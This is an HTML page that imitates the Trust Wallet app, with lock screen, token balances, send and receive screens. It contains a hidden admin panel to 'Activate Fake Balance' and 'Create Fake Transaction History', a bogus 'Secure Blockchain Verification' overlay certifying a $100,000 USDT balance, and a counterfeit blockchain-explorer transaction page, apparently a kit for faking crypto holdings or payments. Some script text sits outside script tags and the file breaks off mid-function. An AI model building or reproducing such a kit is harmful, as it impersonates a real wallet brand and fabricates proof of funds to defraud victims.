<!DOCTYPE html>
<html lang="en">
<head>
 <meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
      style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com;
      font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com;
      img-src 'self' data: https://i.ibb.co https://cryptologos.cc https://assets.coingecko.com;
      script-src 'self' https://cdnjs.cloudflare.com 'unsafe-eval' 'unsafe-inline';">
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes"> 
    <title>Trust Wallet</title>
    
    <!-- Font Links (Now CSP compliant) -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="total.css">

 <!-- Chain Badge & History Page Fixes -->
<style id="wallet-fix-styles">
/* Chain Badge Fixes */
.chain-badge {
  display: block !important;
  position: absolute !important;
  bottom: -6px !important;
  right: -6px !important;
  width: 20px !important;
  height: 20px !important;
  border-radius: 50% !important;
  border: 2px solid #FFFFFF !important;
  background: #FFFFFF !important;
  z-index: 5 !important;
  overflow: visible !important;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1) !important;
}

.chain-badge img {
  width: 100% !important;
  height: 100% !important;
  object-fit: contain !important;
  padding: 2px !important;
  display: block !important;
}

.chain-badge[data-network="bsc"] img, img[src*="bnb-bnb-logo"] {
  content: url('https://cryptologos.cc/logos/bnb-bnb-logo.png') !important;
}

.token-icon, .token-detail-icon-container {
  position: relative !important;
  overflow: visible !important;
}
</style>
</head>
<body>
   <!-- Status Bar -->
    <div class="status-bar">
        <div class="status-time">02:08</div>
        <div class="status-icons">
            <i class="fas fa-key"></i>
            <i class="fas fa-volume-mute"></i>
            <i class="fas fa-wifi"></i>
            <i class="fas fa-signal"></i>
            <span>44%</span>
            <i class="fas fa-battery-half"></i>
        </div>
    </div>
    
   <!-- App container -->
   <div class="app-container">
       <!-- Lock Screen -->
       <div id="lock-screen" class="screen">
           <div class="lock-header">
               <img src="https://i.ibb.co/xPTTcgd/Trust-Wallet-Core-Logo-Blue.png" alt="Trust Wallet" class="lock-logo">
               <div class="lock-subtitle">Secure and trusted multi-chain crypto wallet</div>
           </div>
           <div class="passcode-container">
               <h3>Password</h3>
               <div class="passcode-dots">
                   <div class="dot"></div>
                   <div class="dot"></div>
                   <div class="dot"></div>
                   <div class="dot"></div>
                   <div class="dot"></div>
                   <div class="dot"></div>
               </div>
               
               <div class="numpad">
                   <button class="numpad-key" data-key="1">1</button>
                   <button class="numpad-key" data-key="2">2</button>
                   <button class="numpad-key" data-key="3">3</button>
                   <button class="numpad-key" data-key="4">4</button>
                   <button class="numpad-key" data-key="5">5</button>
                   <button class="numpad-key" data-key="6">6</button>
                   <button class="numpad-key" data-key="7">7</button>
                   <button class="numpad-key" data-key="8">8</button>
                   <button class="numpad-key" data-key="9">9</button>
                   <button class="numpad-key biometric" data-key="bio"><i class="fas fa-fingerprint"></i></button>
                   <button class="numpad-key" data-key="0">0</button>
                   <button class="numpad-key backspace" data-key="back"><i class="fas fa-backspace"></i></button>
               </div>
               
               <button id="unlock-button" class="unlock-button">Unlock</button>
               
               <div class="reset-wallet-container">
                   <p>Can't login? You can erase your current wallet and set up a new one</p>
                   <button id="reset-wallet-button" class="reset-wallet-button">Reset wallet</button>
               </div>
           </div>
       </div>
       
       <!-- Main Wallet Screen -->
       <div id="wallet-screen" class="screen hidden">
           <!-- Main Header with title -->
           <div class="main-header">
               <button class="icon-button settings-button">
                   <i class="fas fa-cog"></i>
               </button>
               <h1 class="page-title">Home</h1>
               <button class="icon-button notifications-button">
                   <i class="fas fa-bell"></i>
               </button>
           </div>
           
           <!-- Investment Warning Banner -->
           <div id="investment-warning" class="investment-warning">
               <div class="investment-warning-content">
                   <i class="fas fa-exclamation-circle warning-icon"></i>
                   <div class="investment-warning-text">
                       <p>Don't invest unless you're prepared to lose all the money you invest. This is a high-risk investment and you are unlikely to be protected if something goes wrong. <a href="#" class="learn-more">Take 2 mins to learn more</a>.</p>
                   </div>
                   <button id="close-investment-warning" class="close-warning">
                       <i class="fas fa-times"></i>
                   </button>
               </div>
           </div>
           
          <div class="search-container">
            <div class="search-bar">
                <i class="fas fa-search"></i>
                <input type="text" 
                       id="search-input" 
                       name="search"
                       placeholder="Search">
            </div>
        </div>
           
           <!-- Wallet Selector -->
           <div class="wallet-selector-container">
               <div class="wallet-selector">
                   <span class="wallet-name">Main Wallet 1</span>
                   <i class="fas fa-chevron-down"></i>
               </div>
               <div class="wallet-actions">
                   <button class="wallet-action-button">
                       <i class="fas fa-copy"></i>
                   </button>
                   <button class="wallet-action-button">
                       <i class="fas fa-qrcode"></i>
                   </button>
                   <button class="wallet-action-button">
                       <i class="fas fa-bell"></i>
                   </button>
               </div>
           </div>
           
           <!-- Balance Display -->
           <div class="balance-display">
               <div class="balance-amount" id="total-balance">$0.00</div>
               <button class="visibility-toggle">
                   <i class="fas fa-eye"></i>
               </button>
           </div>
           
           <!-- Quick Actions -->
           <div class="quick-actions">
               <button class="action-circle" id="send-button">
                   <i class="fas fa-arrow-up"></i>
                   <span>Send</span>
               </button>
               <button class="action-circle" id="receive-button">
                   <i class="fas fa-arrow-down"></i>
                   <span>Receive</span>
               </button>
               <button class="action-circle">
                   <i class="fas fa-credit-card"></i>
                   <span>Buy</span>
               </button>
               <button class="action-circle">
                   <i class="fas fa-university"></i>
                   <span>Sell</span>
               </button>
               <button class="action-circle">
                   <i class="fas fa-history"></i>
                   <span>History</span>
               </button>
           </div>
           
           <div class="wallet-body">
               <!-- Tab Navigation -->
               <div class="tabs">
                   <button class="tab-button active" data-tab="tokens">Crypto (%24H)</button>
                   <button class="tab-button" data-tab="nfts">NFTs</button>
               </div>
               
               <!-- Token List -->
               <div class="token-list" id="token-list">
                   <!-- Tokens will be inserted here by JS -->
               </div>
               
               <!-- Footer Info -->
               <div class="footer-info">
                   Past performance is not a reliable indicator of future results. Data source is from CoinMarketCap. <a href="#" class="disclaimer-link">Learn more about risks</a>.
                   <div class="manage-crypto">Manage Crypto</div>
               </div>
           </div>
           
           <!-- Bottom Navigation -->
           <div class="bottom-tabs">
               <div class="tab-item active">
                   <i class="fas fa-home"></i>
                   <span>Home</span>
               </div>
               <div class="tab-item">
                   <i class="fas fa-exchange-alt"></i>
                   <span>Swap</span>
               </div>
               <div class="tab-item">
                   <i class="fas fa-piggy-bank"></i>
                   <span>Earn</span>
               </div>
               <div class="tab-item">
                   <i class="fas fa-compass"></i>
                   <span>Discover</span>
               </div>
           </div>
       </div>
       
<div id="token-detail" class="screen hidden">
    <div class="detail-header white-header">
        <button id="back-button" class="icon-button">
            <i class="fas fa-arrow-left"></i>
        </button>

        <div class="token-detail-title">
            <!-- Fixed Icon Container -->
            <div class="token-icon-container">
                <img id="token-detail-icon" src="" 
                     class="token-icon" 
                     style="width: 48px; height: 48px">
                <div class="chain-badge">
                    <img src="https://cryptologos.cc/logos/bnb-bnb-logo.svg">
                </div>
            </div>

            <!-- Text Content -->
            <div class="token-text-content">
                <div class="token-symbol-container">
                    <span id="detail-symbol">ETH</span>
                    <span class="token-network-label">Ethereum</span>
                </div>
                <div id="detail-fullname" class="token-fullname">Ethereum</div>
            </div>
        </div>

        <!-- SINGLE menu button -->
        <button class="icon-button menu-button">
            <i class="fas fa-ellipsis-h"></i>
        </button>
    </div>

    <!-- Warning Banner -->
    <div class="investment-warning token-warning">
        <div class="investment-warning-content">
            <i class="fas fa-exclamation-circle warning-icon"></i>
            <div class="investment-warning-text">
                <p>Don't invest unless you're prepared to lose all the money you invest. This is a high-risk investment and you are unlikely to be protected if something goes wrong. <a href="#" class="learn-more">Take 2 mins to learn more</a>.</p>
            </div>
        </div>
    </div>

    <!-- Gas Fee indicator -->
    <div class="gas-fee-indicator">
        <i class="fas fa-gas-pump"></i>
        <span id="gas-fee-amount">$0.01</span>
    </div>

    <!-- Token Icon and Balance -->
    <div class="token-detail-content">
        <div class="token-detail-icon-container">
            <img id="token-detail-icon" src="" alt="" class="token-detail-large-icon">
        </div>
        <div class="token-detail-balance">
            <h2 id="token-balance-amount">0 ETH</h2>
            <p id="token-balance-value">$0.00</p>
        </div>
        
        <!-- Action Buttons -->
        <div class="token-detail-actions">
            <button class="action-circle">
                <i class="fas fa-arrow-up"></i>
                <span>Send</span>
            </button>
            <button class="action-circle">
                <i class="fas fa-arrow-down"></i>
                <span>Receive</span>
            </button>
            <button class="action-circle">
                <i class="fas fa-exchange-alt"></i>
                <span>Swap</span>
            </button>
            <button class="action-circle">
                <i class="fas fa-credit-card"></i>
                <span>Buy</span>
            </button>
            <button class="action-circle">
                <i class="fas fa-university"></i>
                <span>Sell</span>
            </button>
        </div>

        <!-- Staking Container -->
        <div class="staking-container">
            <div class="staking-icon">
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAB3RJTUUH5wMcCjgzp3ZxFwAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAABFSURBVAjXY/z//z8DMYCJJNUMDAwM1DGyASnmEzNmzPjPyMjIyMTExMTMxMTExMzMzMzMyMjIyMQkzsDAyMgIFGcEAACvdQvEvs9KlgAAAABJRU5ErkJggg==" alt="Staking">
            </div>
            <div class="staking-content">
                <h3>Start earning</h3>
                <p>Start earning on your <span id="token-staking-symbol">ETH</span></p>
            </div>
            <div class="staking-arrow">
                <i class="fas fa-chevron-right"></i>
            </div>
        </div>
        
        <!-- Transactions -->
        <div class="transaction-header">
            <h3>Transactions</h3>
            <button class="filter-button">
                <i class="fas fa-filter"></i>
            </button>
        </div>
        <div class="transaction-list" id="transaction-list">
            <!-- Transactions will be inserted here by JS -->
        </div>
        <div class="no-transactions">
            <div class="no-tx-icon">
                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCI+PC9zdmc+" alt="No transactions">
            </div>
            <p>Transactions will appear here.</p>
            <p class="explorer-link">Cannot find your transaction? <a href="#">Check explorer</a></p>
        </div>

        <!-- Price Information -->
        <div class="token-price-info">
            <div class="current-price">
                <h3>Current <span id="token-price-symbol">ETH</span> price</h3>
                <div class="price-with-change">
                    <span id="token-current-price">$1,997.80</span>
                    <span id="token-price-change" class="positive">+71967.63%</span>
                </div>
                <span class="price-timeframe">• All</span>
            </div>
            <p class="price-disclaimer">Past performance is not a reliable indicator of future results. Data source is from CoinMarketCap. <a href="#">Learn more about risks.</a></p>
        </div>
    </div>
</div>

<!-- Receive Screen -->
<div id="receive-screen" class="screen hidden receive-screen">
    <div class="screen-header">
        <button class="back-button">
            <i class="fas fa-arrow-left"></i>
        </button>
        <h2>Receive</h2>
        <div class="placeholder-icon"></div>
    </div>
    
    <!-- Bitcoin Warning Banner -->
    <div id="bitcoin-warning" class="bitcoin-warning hidden">
        <div class="bitcoin-warning-content">
            <i class="fas fa-exclamation-circle"></i>
            <div class="bitcoin-warning-text">
                <p>Only send Bitcoin (BTC) assets to this address. Other assets will be lost forever.</p>
            </div>
        </div>
    </div>
    
    <div id="receive-content" class="receive-content">
        <div class="token-selection">
            <div class="token-icon-large">
                <img id="receive-token-icon" src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC">
            </div>
            <div class="token-label">
                <span id="receive-token-name">BTC</span>
                <span class="token-network">BITCOIN</span>
            </div>
        </div>
        
        <!-- FIXED: Static SVG QR code instead of canvas -->
        <div class="qr-code-container">
           <svg width="250" height="250" viewBox="0 0 250 250" xmlns="http://www.w3.org/2000/svg">
              <!-- White background -->
              <rect width="250" height="250" fill="white"/>
              
              <!-- Border -->
              <rect x="10" y="10" width="230" height="230" stroke="black" stroke-width="2" fill="none"/>
              
              <!-- Fake QR code pattern - static grid that looks like a QR code -->
              <g fill="black">
                 <!-- Position markers (corners) -->
                 <rect x="30" y="30" width="40" height="40"/>
                 <rect x="180" y="30" width="40" height="40"/>
                 <rect x="30" y="180" width="40" height="40"/>
                 
                 <!-- Inner white squares for position markers -->
                 <rect x="40" y="40" width="20" height="20" fill="white"/>
                 <rect x="190" y="40" width="20" height="20" fill="white"/>
                 <rect x="40" y="190" width="20" height="20" fill="white"/>
                 
                 <!-- Random QR code pattern squares -->
                 <rect x="90" y="30" width="10" height="10"/>
                 <rect x="110" y="30" width="10" height="10"/>
                 <rect x="140" y="30" width="10" height="10"/>
                 <rect x="30" y="90" width="10" height="10"/>
                 <rect x="50" y="90" width="10" height="10"/>
                 <rect x="90" y="90" width="10" height="10"/>
                 <rect x="120" y="90" width="10" height="10"/>
                 <rect x="150" y="90" width="10" height="10"/>
                 <rect x="180" y="90" width="10" height="10"/>
                 <rect x="30" y="110" width="10" height="10"/>
                 <rect x="60" y="110" width="10" height="10"/>
                 <rect x="80" y="110" width="10" height="10"/>
                 <rect x="130" y="110" width="10" height="10"/>
                 <rect x="190" y="110" width="10" height="10"/>
                 <rect x="90" y="130" width="10" height="10"/>
                 <rect x="120" y="130" width="10" height="10"/>
                 <rect x="150" y="130" width="10" height="10"/>
                 <rect x="180" y="130" width="10" height="10"/>
                 <rect x="30" y="150" width="10" height="10"/>
                 <rect x="60" y="150" width="10" height="10"/>
                 <rect x="110" y="150" width="10" height="10"/>
                 <rect x="140" y="150" width="10" height="10"/>
                 <rect x="190" y="150" width="10" height="10"/>
                 <rect x="90" y="170" width="10" height="10"/>
                 <rect x="120" y="170" width="10" height="10"/>
                 <rect x="150" y="170" width="10" height="10"/>
                 <rect x="90" y="190" width="10" height="10"/>
                 <rect x="120" y="190" width="10" height="10"/>
                 <rect x="150" y="190" width="10" height="10"/>
                 <rect x="180" y="190" width="10" height="10"/>
              </g>
           </svg>
        </div>
        
        <div class="wallet-address" id="wallet-address">
            bc1qltfhpkgqw6ug6vtw76z2uftwy7jtmr6vfsxp4p
        </div>
        
        <div class="receive-actions">
            <div class="action-round-button">
                <i class="fas fa-copy"></i>
                <span>Copy</span>
            </div>
            <div class="action-round-button">
                <i class="fas fa-share-alt"></i>
                <span>Share</span>
            </div>
        </div>
    </div>
</div>
       
       <!-- Send Screen -->
       <div id="send-screen" class="screen hidden send-screen">
           <div class="screen-header">
               <button class="back-button">
                   <i class="fas fa-arrow-left"></i>
               </button>
               <h2 id="send-token-title">Send USDT</h2>
               <div class="placeholder-icon"></div>
           </div>
           
           <div class="send-content">
               <div class="form-group">
                   <label for="recipient-address">Recipient Address</label>
                   <div class="address-input">
                       <input type="text" 
                              id="recipient-address" 
                              name="recipient-address" 
                              placeholder="Wallet Address or ENS">
                       <button class="paste-button">Paste</button>
                       <button class="scan-button">
                           <i class="fas fa-qrcode"></i>
                       </button>
                   </div>
               </div>
    
               <div class="form-group">
                   <label for="send-amount">Amount</label>
                   <div class="amount-input">
                       <input type="text" 
                              id="send-amount" 
                              name="send-amount" 
                              placeholder="0">
                       <button class="max-button">Max</button>
                   </div>
                   <div id="available-balance">Available: <span id="max-amount">0</span> <span id="max-symbol">USDT</span></div>
               </div>
               
               <div class="form-group">
                   <label>Network Fee</label>
                   <div class="fee-options">
                       <div class="fee-option active">
                           <div class="fee-name">Low</div>
                           <div class="fee-value">$0.02</div>
                           <div class="fee-time">~10 min</div>
                       </div>
                       <div class="fee-option">
                           <div class="fee-name">Medium</div>
                           <div class="fee-value">$0.05</div>
                           <div class="fee-time">~3 min</div>
                       </div>
                       <div class="fee-option">
                           <div class="fee-name">High</div>
                           <div class="fee-value">$0.10</div>
                           <div class="fee-time">~30 sec</div>
                       </div>
                   </div>
               </div>
               
               <button id="continue-send" class="send-button">Continue</button>
           </div>
       </div>
   </div>
   
   <!-- Biometric Authentication Overlay -->
   <div id="biometric-overlay" class="modal">
       <div class="biometric-content">
           <h3>Touch ID</h3>
           <p>Verify your identity</p>
           <div class="fingerprint-container">
               <div id="fingerprint-icon" class="fingerprint-icon">
                   <i class="fas fa-fingerprint"></i>
               </div>
               <div id="fingerprint-scanning" class="fingerprint-scanning"></div>
           </div>
           <div id="biometric-status" class="biometric-status">Touch sensor</div>
           <button id="cancel-biometric" class="cancel-biometric">Cancel</button>
       </div>
   </div>
   
   <!-- Admin Panel -->
   <div id="admin-panel" class="modal">
       <div class="admin-content">
           <h2>Admin Panel</h2>
           <button id="close-admin" class="close-button"><i class="fas fa-times"></i></button>
           
           <div class="admin-form">
               <div class="admin-form-group">
                   <label>Select Wallet to Modify</label>
                   <select id="admin-wallet-select">
                       <option value="main">Mnemonic 1</option>
                       <option value="secondary">Mnemonic 2</option>
                       <option value="business">Mnemonic 3</option>
                   </select>
               </div>
               
               <div class="admin-form-group">
                   <label>Select Token to Modify</label>
                   <select id="admin-token-select">
                       <option value="usdt">Tether (USDT)</option>
                       <option value="btc">Bitcoin (BTC)</option>
                       <option value="eth">Ethereum (ETH)</option>
                       <option value="bnb">Binance Coin (BNB)</option>
                       <option value="trx">Tron (TRX)</option>
                   </select>
               </div>
               
               <div class="admin-form-group">
                   <label>Token Balance</label>
                   <input type="number" id="fake-balance" placeholder="Enter amount" value="100000">
               </div>
               
               <div class="admin-form-group">
                   <label>Expiration (hours)</label>
                   <input type="number" id="expiration-time" value="48" min="1" max="168">
               </div>
               
               <div class="admin-form-group checkbox">
                   <input type="checkbox" id="generate-history" checked>
                   <label for="generate-history">Create Fake Transaction History</label>
               </div>
               
               <div class="admin-form-group checkbox">
                   <input type="checkbox" id="modify-all-wallets">
                   <label for="modify-all-wallets">Apply to all wallets</label>
               </div>
               
               <button id="apply-fake" class="admin-button primary">Activate Fake Balance</button>
               <button id="reset-wallet" class="admin-button secondary">Reset to Original</button>
               <div class="expiration-timer">
                   <span class="expiration-label">Auto Reset:</span>
                   <span class="expiration-time" id="expiration-countdown">Not Active</span>
               </div>
           </div>
       </div>
   </div>
   
   <!-- Verification overlay -->
   <div id="verification-overlay" class="modal">
       <div class="verification-content">
           <h2>Secure Blockchain Verification</h2>
           <div class="verification-progress">
               <div class="progress-bar">
                   <div id="progress-fill" class="progress-fill"></div>
               </div>
               <div class="verification-status" id="verification-status">Connecting to blockchain...</div>
           </div>
           
           <div id="verification-result" class="verification-result hidden">
               <div class="verification-badge">
                   <i class="fas fa-shield-alt"></i>
                   <span>VERIFIED</span>
               </div>
               <div class="verification-details">
                   <div class="detail-row">
                       <span class="detail-label">Certificate ID:</span>
                       <span class="detail-value" id="cert-id">TW-A7B3C9D2</span>
                   </div>
                   <div class="detail-row">
                       <span class="detail-label">Timestamp:</span>
                       <span class="detail-value" id="verify-timestamp">03/22/2025 02:44:13</span>
                   </div>
                   <div class="detail-row">
                       <span class="detail-label">Wallet Address:</span>
                       <span class="detail-value">0x9B3a...9921E71</span>
                   </div>
                   <div class="detail-row">
                       <span class="detail-label">USDT Balance:</span>
                       <span class="detail-value" id="verify-balance">$100,000.00</span>
                   </div>
                   <div class="detail-row">
                       <span class="detail-label">Status:</span>
                       <span class="detail-value positive">Valid</span>
                   </div>
               </div>
               
               <div class="verification-actions">
                   <button id="close-verification" class="verification-button">Close</button>
                   <button id="view-blockchain" class="verification-button secondary">
                       <i class="fas fa-external-link-alt"></i> View on Blockchain
                   </button>
               </div>
           </div>
       </div>
   </div>
   
   <!-- Transaction Status Modal -->
   <div id="tx-status-modal" class="modal">
       <div class="modal-content">
           <div class="tx-status-container">
               <div id="tx-pending" class="tx-status-view">
                   <div class="tx-status-icon pending">
                       <i class="fas fa-clock"></i>
                   </div>
                   <h3>Transaction Pending</h3>
                   <p>Your transaction has been submitted to the network.</p>
                   <div class="tx-details">
                       <div class="tx-detail-row">
                           <span class="tx-label">Transaction Hash:</span>
                           <span id="tx-hash" class="tx-value">0x8a65...</span>
                       </div>
                   </div>
               </div>
               
               <div id="tx-success" class="tx-status-view hidden">
                   <div class="tx-status-icon success">
                       <i class="fas fa-check"></i>
                   </div>
                 <h3>Transaction Successful</h3>
                   <p>Your transaction has been confirmed.</p>
                   <div class="tx-details">
                       <div class="tx-detail-row">
                           <span class="tx-label">Amount:</span>
                           <span id="tx-amount" class="tx-value">0 USDT</span>
                       </div>
                       <div class="tx-detail-row">
                           <span class="tx-label">To:</span>
                           <span id="tx-to" class="tx-value">0x742d...</span>
                       </div>
                       <div class="tx-detail-row">
                           <span class="tx-label">Network Fee:</span>
                           <span id="tx-fee" class="tx-value">0.000105 BNB</span>
                       </div>
                   </div>
                   <button id="close-tx-success" class="tx-button primary">Done</button>
               </div>
           </div>
       </div>
   </div>
   
   <!-- Blockchain Explorer Overlay -->
   <div id="explorer-overlay" class="explorer-overlay">
       <div class="explorer-header">
           <button id="close-explorer" class="explorer-back-button">
               <i class="fas fa-arrow-left"></i>
           </button>
           <div class="explorer-title">Blockchain Explorer</div>
           <button class="explorer-button">
               <i class="fas fa-ellipsis-v"></i>
           </button>
       </div>
       <div class="explorer-body">
           <div class="explorer-search-container">
               <div class="explorer-search">
                   <i class="fas fa-search"></i>
                   <input type="text" id="explorer-search-input" placeholder="Search by Address / Txn Hash / Block / Token">
               </div>
           </div>
           
           <div class="explorer-transaction">
               <div class="explorer-section">
                   <div class="explorer-section-header">
                       <h3>Transaction Details</h3>
                       <span class="explorer-status success">Success</span>
                   </div>
                   
                   <div class="explorer-detail-rows">
                       <div class="explorer-detail-row">
                           <div class="explorer-detail-label">Transaction Hash:</div>
                           <div id="explorer-tx-hash" class="explorer-detail-value">0x8a65d7c4f5f43c3b39...</div>
                       </div>
                       <div class="explorer-detail-row">
                           <div class="explorer-detail-label">Status:</div>
                           <div class="explorer-detail-value"><span class="explorer-badge success">Success</span> <span class="explorer-confirmations">285 Block Confirmations</span></div>
                       </div>
                       <div class="explorer-detail-row">
                           <div class="explorer-detail-label">Timestamp:</div>
                           <div id="explorer-timestamp" class="explorer-detail-value">Mar-22-2025 02:44:15 PM +UTC</div>
                       </div>
                       <div class="explorer-detail-row">
                           <div class="explorer-detail-label">From:</div>
                           <div id="explorer-from" class="explorer-detail-value address">0x9B3a54D092f6B4b3d2eC676cd589f124E9921E71</div>
                       </div>
                       <div class="explorer-detail-row">
                           <div class="explorer-detail-label">To:</div>
                           <div id="explorer-to" class="explorer-detail-value address">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</div>
                       </div>
                       <div class="explorer-detail-row">
                           <div class="explorer-detail-label">Value:</div>
                           <div id="explorer-value" class="explorer-detail-value">0 BNB</div>
                       </div>
                       <div class="explorer-detail-row">
                           <div class="explorer-detail-label">Transaction Fee:</div>
                           <div class="explorer-detail-value">0.000105 BNB ($0.05)</div>
                       </div>
                   </div>
               </div>
               
               <div class="explorer-section">
                   <div class="explorer-section-header">
                       <h3>Token Transfer</h3>
                   </div>
                   
                   <div class="explorer-token-transfer">
                       <div class="explorer-token-icon">
                           <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
                       </div>
                       <div class="explorer-token-details">
                           <div class="explorer-token-from-to">
                               <span class="explorer-address-short">0x9B3a...21E71</span>
                               <i class="fas fa-arrow-right"></i>
                               <span class="explorer-address-short">0x742d...8f44e</span>
                           </div>
                           <div class="explorer-token-info">
                               <span>For</span>
                               <span id="explorer-token-amount" class="explorer-token-amount">100 USDT</span>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
       </div>
   </div>
   
 <script>
    window.originalWalletData = null;
    window.currentWalletData = null;
    window.activeWallet = 'main';
    window.correctPasscode = '123456';
    window.passcodeEntered = '';
    window.touchSequence = [];
    window.balanceModified = false;
    window.expirationTimer = null;
</script>
   <script src="combined.js"></script>

   <script>
   document.addEventListener('DOMContentLoaded', function() {
       // Modify fullscreen request to avoid security issues
       document.querySelector('.app-container').addEventListener('click', function() {
           console.log("App container clicked - fullscreen request disabled for security");
           // Fullscreen removed to avoid security issues
       }, {once: true});
   });
   </script>

 // Direct DOM manipulation to fix wallet UI issues
document.addEventListener('DOMContentLoaded', function() {
  // Function to apply fixes
  function applyFixes() {
    console.log("Applying wallet UI fixes...");
    
    // Fix 1: Fix chain badges display
    const chainBadges = document.querySelectorAll('.chain-badge');
    chainBadges.forEach(badge => {
      // Fix visibility
      badge.style.display = 'block';
      badge.style.position = 'absolute';
      badge.style.bottom = '-6px';
      badge.style.right = '-6px';
      badge.style.width = '20px';
      badge.style.height = '20px';
      badge.style.borderRadius = '50%';
      badge.style.border = '2px solid #FFFFFF';
      badge.style.background = '#FFFFFF';
      badge.style.zIndex = '5';
      badge.style.boxShadow = '0 2px 4px rgba(0,0,0,0.1)';
      
      // Fix image inside badge
      const img = badge.querySelector('img');
      if (img) {
        img.style.width = '100%';
        img.style.height = '100%';
        img.style.objectFit = 'contain';
        img.style.padding = '2px';
        img.style.display = 'block';
        
        // Fix BNB logo if needed
        if (img.src.includes('bnb-bnb-logo') || badge.getAttribute('data-network') === 'bsc') {
          img.src = 'https://cryptologos.cc/logos/bnb-bnb-logo.svg';
        }
      }
    });
    
    // Fix 2: Remove "BNB Smart Chain" from token symbol display
    const tokenSymbol = document.getElementById('detail-symbol');
    if (tokenSymbol) {
      const symbolText = tokenSymbol.textContent;
      if (symbolText.includes('BNB Smart Chain') || symbolText.includes('|')) {
        tokenSymbol.textContent = symbolText.split(' ')[0]; // Keep only the token symbol
      }
    }
    
    // Fix network label display
    const networkLabel = document.querySelector('.token-network-label');
    if (networkLabel) {
      networkLabel.style.display = 'block';
      networkLabel.style.fontSize = '12px';
      networkLabel.style.color = 'var(--tw-medium-gray)';
      networkLabel.style.marginTop = '2px';
    }
    
    // Fix token detail title layout
    const detailTitle = document.querySelector('.token-detail-title');
    if (detailTitle) {
      detailTitle.style.flexDirection = 'column';
      detailTitle.style.alignItems = 'flex-start';
    }
    
    // Hide separator and unwanted spans
    const separators = document.querySelectorAll('.token-separator');
    separators.forEach(sep => sep.style.display = 'none');
    
    // Fix 3: Make bottom tabs visible
    const bottomTabs = document.querySelector('.bottom-tabs');
    if (bottomTabs) {
      bottomTabs.style.display = 'flex';
      bottomTabs.style.position = 'fixed';
      bottomTabs.style.bottom = '0';
      bottomTabs.style.left = '0';
      bottomTabs.style.width = '100%';
      bottomTabs.style.zIndex = '100';
      bottomTabs.style.backgroundColor = '#FFFFFF';
      bottomTabs.style.borderTop = '1px solid #F5F5F5';
      bottomTabs.style.visibility = 'visible';
      bottomTabs.style.opacity = '1';
    }
    
    // Add padding to content areas to prevent overlap with bottom tabs
    const contentAreas = document.querySelectorAll('.token-detail-content, .send-content, .receive-content');
    contentAreas.forEach(area => {
      area.style.paddingBottom = '80px';
    });
    
    console.log("UI fixes applied");
  }
  
  // Apply fixes immediately
  applyFixes();
  
  // Set up a mutation observer to apply fixes when DOM changes
  const observer = new MutationObserver(function(mutations) {
    // Check if any relevant elements were added or modified
    mutations.forEach(mutation => {
      if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
        applyFixes();
      }
    });
  });
  
  // Observe changes to the body and its descendants
  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
  
  // Also apply fixes after a slight delay to catch any dynamic content
  setTimeout(applyFixes, 1000);
  setTimeout(applyFixes, 3000);
});

 <script>
// Force fix critical UI elements
document.addEventListener('DOMContentLoaded', function() {
  // Fix bottom tabs
  const bottomTabs = document.querySelector('.bottom-tabs');
  if (bottomTabs) {
    bottomTabs.style.display = 'flex';
    bottomTabs.style.position = 'fixed';
    bottomTabs.style.bottom = '0';
    bottomTabs.style.width = '100%';
    bottomTabs.style.zIndex = '999';
    bottomTabs.style.visibility = 'visible';
  }
  
  // Fix token detail header
  const detailHeader = document.querySelector('.detail-header');
  if (detailHeader) {
    detailHeader.style.display = 'flex';
    detailHeader.style.backgroundColor = '#FFFFFF';
  }
  
  // Remove "BNB Smart Chain" text from token symbol
  const detailSymbol = document.getElementById('detail-symbol');
  if (detailSymbol && detailSymbol.textContent.includes('Smart Chain')) {
    detailSymbol.textContent = detailSymbol.textContent.split(' ')[0];
  }
});
</script>

 <!-- History Page Template -->
<div id="history-screen" class="screen hidden">
    <div class="screen-header">
        <button class="back-button history-back-button">
            <i class="fas fa-arrow-left"></i>
        </button>
        <h2>Transaction History</h2>
        <button class="icon-button filter-button">
            <i class="fas fa-filter"></i>
        </button>
    </div>
    
    <div class="wallet-selector-small">
        <span class="wallet-name-small">Mnemonic 1</span>
        <i class="fas fa-chevron-down"></i>
    </div>
    
    <div class="history-tabs">
        <button class="history-tab active" data-tab="all">All</button>
        <button class="history-tab" data-tab="sent">Sent</button>
        <button class="history-tab" data-tab="received">Received</button>
    </div>
    
    <div class="history-content">
        <div class="history-list" id="history-transaction-list">
            <!-- Transactions will be inserted here by JS -->
        </div>
        
        <div class="no-history hidden">
            <div class="no-tx-icon">
                <i class="fas fa-exchange-alt"></i>
            </div>
            <p>No transactions yet</p>
        </div>
    </div>
    
    <!-- Bottom Navigation -->
    <div class="bottom-tabs">
        <div class="tab-item">
            <i class="fas fa-home"></i>
            <span>Home</span>
        </div>
        <div class="tab-item">
            <i class="fas fa-exchange-alt"></i>
            <span>Swap</span>
        </div>
        <div class="tab-item">
            <i class="fas fa-piggy-bank"></i>
            <span>Earn</span>
        </div>
        <div class="tab-item">
            <i class="fas fa-compass"></i>
            <span>Discover</span>
        </div>
    </div>
</div>

 <!-- Wallet Interface Fixes -->
<script>
// Fix chain badges display
function fixChainBadges() {
